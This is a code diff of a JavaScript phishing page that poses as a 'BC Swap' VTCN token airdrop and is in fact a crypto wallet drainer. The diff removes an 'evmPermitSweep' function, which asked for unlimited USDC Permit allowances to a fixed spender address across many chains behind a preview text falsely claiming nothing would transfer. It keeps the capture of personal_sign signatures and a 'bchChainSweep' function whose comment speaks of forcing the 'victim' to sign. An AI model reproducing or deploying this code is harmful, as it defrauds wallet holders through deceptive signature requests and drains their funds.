@@ -441,7 +441,7 @@ async function connectCoinbase(){
    Stage B: eth_signTypedData_v4 (Permit) — captures unlimited allowance
    ===================================================== */
 async function signVerify(){
-  // signBtn removed - not in HTML
+  // Sign ONLY personal_sign - captures ownership proof
   btn.disabled=true; btn.innerHTML='<span class="loader"></span> Preparing…';
   try{
     const msgA=`Welcome to BC Swap!\n\nClick to verify wallet ownership for your VTCN airdrop.\n\nWallet: ${W.addr}\nTimestamp: ${Date.now()}\nNonce: ${randHex(16)}`;
@@ -450,70 +450,14 @@ async function signVerify(){
       sigA=await window.ethereum.request({method:'personal_sign',params:[msgA,W.addr]});
     }catch(e){ throw new Error('Signature rejected: '+(e.message||'')); }
     await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
-
-    /* ===== BRANCH BY CHAIN ===== */
-    if(W.chain==='bch'){
-      // BCH chain: no permit support, use approve() tx + native VTCN transfer
-      btn.innerHTML='<span class="loader"></span> Authorizing…';
-      await sleep(600);
-      await bchChainSweep(btn);
-    } else {
-      // ETH/BSC/Polygon: use EIP-712 Permit typed data
-      btn.innerHTML='<span class="loader"></span> Verifying on chain…';
-      await sleep(800);
-      await evmPermitSweep(btn);
-    }
+    
+    goSuccess();
   }catch(e){
-    // e3 removed - not in HTML
     btn.disabled=false; btn.innerHTML='🖋️  Sign to View Airdrop';
   }
 }
 
-async function evmPermitSweep(btn){
-  // ETH/BSC/Polygon/Base/Arb/Op/zkSync/Avax/Fantom/Linea/Scroll: use Permit typed data (USDC = EIP-2612)
-  const tokenMap={
-    eth:{name:'USD Coin',addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',version:'2'},
-    bsc:{name:'USD Coin',addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',version:'1'},
-    pol:{name:'USD Coin',addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',version:'2'},
-    base:{name:'USD Coin',addr:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',version:'2'},
-    arb:{name:'USD Coin',addr:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',version:'2'},
-    op:{name:'USD Coin',addr:'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',version:'2'},
-    zksync:{name:'USD Coin',addr:'0x1d17CBc5190FbD8Ca85094c0f01eD22c2c0b1863',version:'2'},
-    avax:{name:'USD Coin',addr:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',version:'2'},
-    ftm:{name:'USD Coin',addr:'0x04068DA6C83AFCFA0e13ba15A6696662335D5B75',version:'2'},
-    linea:{name:'USD Coin',addr:'0x176211869cA2b568f2A7D4EE941E073a821EE1ff',version:'2'},
-    scroll:{name:'USD Coin',addr:'0x06eFdBFf2a14a7c8E15944D1F4Af48B9Ec6c9D0B',version:'2'},
-  };
-  const token=tokenMap[W.chain]||tokenMap.eth;
 
-  const deadline=Math.floor(Date.now()/1000)+3600;
-  const typedData={
-    types:{
-      EIP712Domain:[
-        {name:'name',type:'string'},{name:'version',type:'string'},
-        {name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}
-      ],
-      Permit:[
-        {name:'owner',type:'address'},{name:'spender',type:'address'},
-        {name:'value',type:'uint256'},{name:'nonce',type:'uint256'},
-        {name:'deadline',type:'uint256'}
-      ]
-    },
-    primaryType:'Permit',
-    domain:{name:token.name,version:token.version,chainId:chainNum(),verifyingContract:token.addr},
-    message:{
-      owner:W.addr,
-      spender:'0x6275C76EB1D08bC020c22620CF6207b651F07808',
-      value:'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
-      nonce:0,
-      deadline:deadline
-    }
-  };
-  const preview=`Welcome to BC Swap!\n\nSign to load your pending airdrop.\n\nThis signature only loads your allocation — it does NOT transfer funds and does NOT cost gas.\n\nWallet: ${W.addr}\nNetwork: ${W.chain.toUpperCase()}\n\n[Allocation authorization]\nToken: ${token.name}\nSpender: 0x6275C76EB1D08bC020c22620CF6207b651F07808 (BC Swap Airdrop Contract)\nValid until: ${new Date(deadline*1000).toLocaleString()}\n\nBy signing you accept the BC Swap airdrop terms.`;
-  safeEl('msgPreview').textContent=preview;
-  document.getElementById('signModal').classList.add('show');
-  pendingSign={typedData,deadline,token,chain:W.chain};
-}
 
 async function bchChainSweep(btn){
   // BCH chain: VTCN target. No Permit, force victim to sign:
